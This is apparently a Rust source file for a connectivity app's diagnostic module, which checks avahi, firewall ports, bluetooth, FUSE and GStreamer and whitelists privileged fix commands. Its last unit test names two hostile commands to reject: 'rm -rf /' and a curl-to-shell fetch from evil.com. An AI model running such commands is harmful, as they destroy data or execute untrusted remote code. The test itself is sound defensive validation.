//! Connection Doctor: diagnoses networking, firewall, bluetooth, service dependencies,
//! and feature capabilities to find and explain what keeps the phone from connecting
//! or a feature from working.

use std::path::Path;
use std::process::{Command, Stdio};

use serde::{Deserialize, Serialize};

use crate::capabilities::SystemProber;

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum CheckStatus {
    #[default]
    Ok,
    Warn,
    Fail,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DoctorCheck {
    pub id: String,
    pub title: String,
    pub status: CheckStatus,
    pub detail: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub fix: Option<String>,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DoctorReport {
    pub checks: Vec<DoctorCheck>,
}

impl DoctorReport {
    pub fn is_ok(&self) -> bool {
        self.checks.iter().all(|c| c.status == CheckStatus::Ok)
    }

    pub fn fail_count(&self) -> usize {
        self.checks
            .iter()
            .filter(|c| c.status == CheckStatus::Fail)
            .count()
    }

    pub fn warn_count(&self) -> usize {
        self.checks
            .iter()
            .filter(|c| c.status == CheckStatus::Warn)
            .count()
    }
}

pub trait DoctorProber {
    fn is_avahi_running(&self) -> bool;
    fn is_port_listening(&self, port: u16) -> bool;
    fn check_firewall(&self, port: u16) -> (CheckStatus, String, Option<String>);
    fn is_bluetooth_active(&self) -> bool;
    fn is_lan_ip_available(&self) -> bool;
    fn is_phone_connected(&self) -> bool;
    fn is_v4l2loopback_loaded(&self) -> bool;
    fn is_fuse_available(&self) -> bool;
    fn is_fusermount3_available(&self) -> bool;
    fn is_gstreamer_webrtcbin_available(&self) -> bool;
    fn is_wayland(&self) -> bool;
    fn is_clipboard_tool_available(&self) -> bool;
}

pub struct LiveDoctorProber {
    pub phone_connected: bool,
}

impl LiveDoctorProber {
    pub fn new(phone_connected: bool) -> Self {
        Self { phone_connected }
    }
}

impl DoctorProber for LiveDoctorProber {
    fn is_avahi_running(&self) -> bool {
        if Path::new("/run/avahi-daemon/pid").exists()
            || Path::new("/var/run/avahi-daemon/pid").exists()
            || Path::new("/run/avahi-daemon/socket").exists()
        {
            return true;
        }
        Command::new("systemctl")
            .args(["is-active", "--quiet", "avahi-daemon"])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    fn is_port_listening(&self, port: u16) -> bool {
        std::net::TcpListener::bind(("127.0.0.1", port)).is_err()
    }

    fn check_firewall(&self, port: u16) -> (CheckStatus, String, Option<String>) {
        let firewalld_active = Command::new("firewall-cmd")
            .arg("--state")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false);

        if firewalld_active {
            let output = Command::new("firewall-cmd")
                .args(["--query-port", &format!("{port}/tcp")])
                .output();
            if let Ok(out) = output {
                if out.status.success() {
                    return (
                        CheckStatus::Ok,
                        format!("firewalld allows TCP port {port}"),
                        None,
                    );
                } else {
                    return (
                        CheckStatus::Fail,
                        format!("firewalld is active but port {port}/tcp is not allowed"),
                        Some(format!(
                            "sudo firewall-cmd --add-port={port}/tcp --permanent && sudo firewall-cmd --reload"
                        )),
                    );
                }
            }
        }

        let ufw_active = Command::new("ufw")
            .arg("status")
            .output()
            .map(|o| {
                o.status.success() && String::from_utf8_lossy(&o.stdout).contains("Status: active")
            })
            .unwrap_or(false);

        if ufw_active {
            return (
                CheckStatus::Warn,
                format!("UFW is active; ensure TCP port {port} is allowed"),
                Some(format!("sudo ufw allow {port}/tcp")),
            );
        }

        (
            CheckStatus::Ok,
            format!("No active firewall blocking port {port} detected"),
            None,
        )
    }

    fn is_bluetooth_active(&self) -> bool {
        if let Ok(entries) = std::fs::read_dir("/sys/class/bluetooth")
            && entries.flatten().next().is_some()
        {
            return true;
        }
        Command::new("systemctl")
            .args(["is-active", "--quiet", "bluetooth"])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    fn is_lan_ip_available(&self) -> bool {
        if let Ok(addrs) = if_addrs::get_if_addrs() {
            addrs.iter().any(|iface| {
                if iface.is_loopback() {
                    return false;
                }
                match iface.ip() {
                    std::net::IpAddr::V4(ip) => ip.is_private(),
                    _ => false,
                }
            })
        } else {
            false
        }
    }

    fn is_phone_connected(&self) -> bool {
        self.phone_connected
    }

    fn is_v4l2loopback_loaded(&self) -> bool {
        crate::capabilities::LiveProber::new(false).is_v4l2loopback_loaded()
    }

    fn is_fuse_available(&self) -> bool {
        crate::capabilities::LiveProber::new(false).is_fuse_available()
    }

    fn is_fusermount3_available(&self) -> bool {
        crate::capabilities::LiveProber::new(false).is_fusermount3_available()
    }

    fn is_gstreamer_webrtcbin_available(&self) -> bool {
        crate::capabilities::LiveProber::new(false).has_gstreamer_element("webrtcbin")
    }

    fn is_wayland(&self) -> bool {
        crate::capabilities::LiveProber::new(false).is_cross_control_supported()
    }

    fn is_clipboard_tool_available(&self) -> bool {
        crate::capabilities::LiveProber::new(false).is_wl_clipboard_available()
    }
}

pub fn run_diagnostics(prober: &dyn DoctorProber) -> DoctorReport {
    let mut checks = Vec::new();

    // 1. Avahi / mDNS discovery
    if prober.is_avahi_running() {
        checks.push(DoctorCheck {
            id: "avahi".into(),
            title: "Avahi mDNS daemon".into(),
            status: CheckStatus::Ok,
            detail: "avahi-daemon is running for local peer discovery".into(),
            fix: None,
        });
    } else {
        checks.push(DoctorCheck {
            id: "avahi".into(),
            title: "Avahi mDNS daemon".into(),
            status: CheckStatus::Fail,
            detail: "avahi-daemon is stopped; phone cannot discover this PC over mDNS".into(),
            fix: Some("sudo systemctl start avahi-daemon".into()),
        });
    }

    // 2. Control WebSocket port (52020)
    let (fw52020_status, fw52020_detail, fw52020_fix) = prober.check_firewall(52020);
    if fw52020_status == CheckStatus::Fail {
        checks.push(DoctorCheck {
            id: "firewall_52020".into(),
            title: "Firewall: Port 52020 (Control)".into(),
            status: CheckStatus::Fail,
            detail: fw52020_detail,
            fix: fw52020_fix,
        });
    } else {
        checks.push(DoctorCheck {
            id: "firewall_52020".into(),
            title: "Firewall: Port 52020 (Control)".into(),
            status: fw52020_status,
            detail: fw52020_detail,
            fix: fw52020_fix,
        });
    }

    // 3. File Station port (2049)
    let (fw2049_status, fw2049_detail, fw2049_fix) = prober.check_firewall(2049);
    checks.push(DoctorCheck {
        id: "firewall_2049".into(),
        title: "Firewall: Port 2049 (File Station)".into(),
        status: fw2049_status,
        detail: fw2049_detail,
        fix: fw2049_fix,
    });

    // 4. Bluetooth service
    if prober.is_bluetooth_active() {
        checks.push(DoctorCheck {
            id: "bluetooth".into(),
            title: "Bluetooth adapter & service".into(),
            status: CheckStatus::Ok,
            detail: "Bluetooth adapter available for BLE reconnect wake".into(),
            fix: None,
        });
    } else {
        checks.push(DoctorCheck {
            id: "bluetooth".into(),
            title: "Bluetooth adapter & service".into(),
            status: CheckStatus::Warn,
            detail: "Bluetooth service or adapter inactive; background wake unavailable".into(),
            fix: Some("sudo systemctl start bluetooth".into()),
        });
    }

    // 5. LAN IP reachability
    if prober.is_lan_ip_available() {
        checks.push(DoctorCheck {
            id: "lan_ip".into(),
            title: "Local network address".into(),
            status: CheckStatus::Ok,
            detail: "Private IPv4 address available for Wi-Fi connection".into(),
            fix: None,
        });
    } else {
        checks.push(DoctorCheck {
            id: "lan_ip".into(),
            title: "Local network address".into(),
            status: CheckStatus::Fail,
            detail: "No private LAN IPv4 address found; Wi-Fi connection impossible".into(),
            fix: Some("Connect to the same Wi-Fi network as the phone".into()),
        });
    }

    // 6. Webcam v4l2loopback
    if prober.is_v4l2loopback_loaded() {
        checks.push(DoctorCheck {
            id: "v4l2loopback".into(),
            title: "Virtual webcam (v4l2loopback)".into(),
            status: CheckStatus::Ok,
            detail: "Kernel module loaded with virtual video device ready".into(),
            fix: None,
        });
    } else {
        checks.push(DoctorCheck {
            id: "v4l2loopback".into(),
            title: "Virtual webcam (v4l2loopback)".into(),
            status: CheckStatus::Warn,
            detail: "v4l2loopback kernel module not loaded; webcam stream unavailable".into(),
            fix: Some("sudo modprobe v4l2loopback devices=1 video_nr=9 card_label='SmartConnect Webcam' exclusive_caps=1".into()),
        });
    }

    // 7. FUSE storage mount
    if !prober.is_fuse_available() {
        checks.push(DoctorCheck {
            id: "fuse".into(),
            title: "FUSE filesystem device".into(),
            status: CheckStatus::Warn,
            detail: "/dev/fuse device node is missing; cannot mount phone storage".into(),
            fix: Some("sudo modprobe fuse".into()),
        });
    } else if !prober.is_fusermount3_available() {
        checks.push(DoctorCheck {
            id: "fusermount3".into(),
            title: "fusermount3 utility".into(),
            status: CheckStatus::Warn,
            detail: "fusermount3 not found in PATH; required for unmounting storage".into(),
            fix: Some(
                "Install fuse3 package (e.g. sudo pacman -S fuse3 or sudo apt install fuse3)"
                    .into(),
            ),
        });
    } else {
        checks.push(DoctorCheck {
            id: "fuse".into(),
            title: "FUSE storage mount".into(),
            status: CheckStatus::Ok,
            detail: "FUSE kernel module and fusermount3 ready for storage mounting".into(),
            fix: None,
        });
    }

    // 8. GStreamer webrtcbin
    if prober.is_gstreamer_webrtcbin_available() {
        checks.push(DoctorCheck {
            id: "gstreamer".into(),
            title: "GStreamer WebRTC support".into(),
            status: CheckStatus::Ok,
            detail: "webrtcbin element is installed for mirroring and webcam".into(),
            fix: None,
        });
    } else {
        checks.push(DoctorCheck {
            id: "gstreamer".into(),
            title: "GStreamer WebRTC support".into(),
            status: CheckStatus::Fail,
            detail: "webrtcbin element missing; screen mirror and webcam cannot stream".into(),
            fix: Some(
                "Install gst-plugins-bad and libnice (e.g. sudo pacman -S gst-plugins-bad libnice)"
                    .into(),
            ),
        });
    }

    // 9. Phone connection state
    if prober.is_phone_connected() {
        checks.push(DoctorCheck {
            id: "phone_connection".into(),
            title: "Phone session".into(),
            status: CheckStatus::Ok,
            detail: "Phone is currently connected and authenticated".into(),
            fix: None,
        });
    } else {
        checks.push(DoctorCheck {
            id: "phone_connection".into(),
            title: "Phone session".into(),
            status: CheckStatus::Warn,
            detail: "Phone is currently disconnected".into(),
            fix: Some("Open Smart Connect on phone or click Connect".into()),
        });
    }

    DoctorReport { checks }
}

/// Whitelist of safe administrative commands that may be executed via pkexec.
pub const SAFE_FIX_COMMANDS: &[&str] = &[
    "systemctl start avahi-daemon",
    "systemctl start bluetooth",
    "modprobe v4l2loopback devices=1 video_nr=9 card_label='SmartConnect Webcam' exclusive_caps=1",
    "modprobe fuse",
    "firewall-cmd --add-port=52020/tcp --permanent",
    "firewall-cmd --add-port=2049/tcp --permanent",
    "firewall-cmd --reload",
    "ufw allow 52020/tcp",
    "ufw allow 2049/tcp",
];

fn clean_cmd(s: &str) -> &str {
    s.trim().strip_prefix("sudo ").unwrap_or(s.trim()).trim()
}

pub fn is_safe_command(cmd: &str) -> bool {
    if cmd.contains("&&") {
        cmd.split("&&")
            .all(|sub| SAFE_FIX_COMMANDS.iter().any(|&s| s == clean_cmd(sub)))
    } else {
        SAFE_FIX_COMMANDS.iter().any(|&s| s == clean_cmd(cmd))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[derive(Default)]
    struct MockDoctorProber {
        avahi: bool,
        port_listening: bool,
        firewall_status: CheckStatus,
        firewall_detail: String,
        firewall_fix: Option<String>,
        bluetooth: bool,
        lan_ip: bool,
        connected: bool,
        v4l2loopback: bool,
        fuse: bool,
        fusermount3: bool,
        webrtcbin: bool,
        wayland: bool,
        clipboard: bool,
    }

    impl MockDoctorProber {
        fn all_healthy() -> Self {
            Self {
                avahi: true,
                port_listening: true,
                firewall_status: CheckStatus::Ok,
                firewall_detail: "Clean".into(),
                firewall_fix: None,
                bluetooth: true,
                lan_ip: true,
                connected: true,
                v4l2loopback: true,
                fuse: true,
                fusermount3: true,
                webrtcbin: true,
                wayland: true,
                clipboard: true,
            }
        }
    }

    impl DoctorProber for MockDoctorProber {
        fn is_avahi_running(&self) -> bool {
            self.avahi
        }
        fn is_port_listening(&self, _port: u16) -> bool {
            self.port_listening
        }
        fn check_firewall(&self, _port: u16) -> (CheckStatus, String, Option<String>) {
            (
                self.firewall_status,
                self.firewall_detail.clone(),
                self.firewall_fix.clone(),
            )
        }
        fn is_bluetooth_active(&self) -> bool {
            self.bluetooth
        }
        fn is_lan_ip_available(&self) -> bool {
            self.lan_ip
        }
        fn is_phone_connected(&self) -> bool {
            self.connected
        }
        fn is_v4l2loopback_loaded(&self) -> bool {
            self.v4l2loopback
        }
        fn is_fuse_available(&self) -> bool {
            self.fuse
        }
        fn is_fusermount3_available(&self) -> bool {
            self.fusermount3
        }
        fn is_gstreamer_webrtcbin_available(&self) -> bool {
            self.webrtcbin
        }
        fn is_wayland(&self) -> bool {
            self.wayland
        }
        fn is_clipboard_tool_available(&self) -> bool {
            self.clipboard
        }
    }

    #[test]
    fn test_all_healthy_report() {
        let prober = MockDoctorProber::all_healthy();
        let report = run_diagnostics(&prober);
        assert!(report.is_ok());
        assert_eq!(report.fail_count(), 0);
        assert_eq!(report.warn_count(), 0);
    }

    #[test]
    fn test_avahi_stopped_fails_with_fix_hint() {
        let prober = MockDoctorProber {
            avahi: false,
            ..MockDoctorProber::all_healthy()
        };
        let report = run_diagnostics(&prober);
        assert!(!report.is_ok());
        assert_eq!(report.fail_count(), 1);
        let avahi_check = report.checks.iter().find(|c| c.id == "avahi").unwrap();
        assert_eq!(avahi_check.status, CheckStatus::Fail);
        assert_eq!(
            avahi_check.fix.as_deref(),
            Some("sudo systemctl start avahi-daemon")
        );
    }

    #[test]
    fn test_v4l2loopback_warn_and_fix() {
        let prober = MockDoctorProber {
            v4l2loopback: false,
            ..MockDoctorProber::all_healthy()
        };
        let report = run_diagnostics(&prober);
        let v4l_check = report
            .checks
            .iter()
            .find(|c| c.id == "v4l2loopback")
            .unwrap();
        assert_eq!(v4l_check.status, CheckStatus::Warn);
        assert!(
            v4l_check
                .fix
                .as_ref()
                .unwrap()
                .contains("modprobe v4l2loopback")
        );
    }

    #[test]
    fn test_command_whitelist_validation() {
        assert!(is_safe_command("sudo systemctl start avahi-daemon"));
        assert!(is_safe_command("systemctl start avahi-daemon"));
        assert!(is_safe_command("sudo modprobe fuse"));
        assert!(is_safe_command(
            "sudo firewall-cmd --add-port=52020/tcp --permanent && sudo firewall-cmd --reload"
        ));
        assert!(!is_safe_command("rm -rf /"));
        assert!(!is_safe_command("curl http://evil.com | sh"));
    }
}
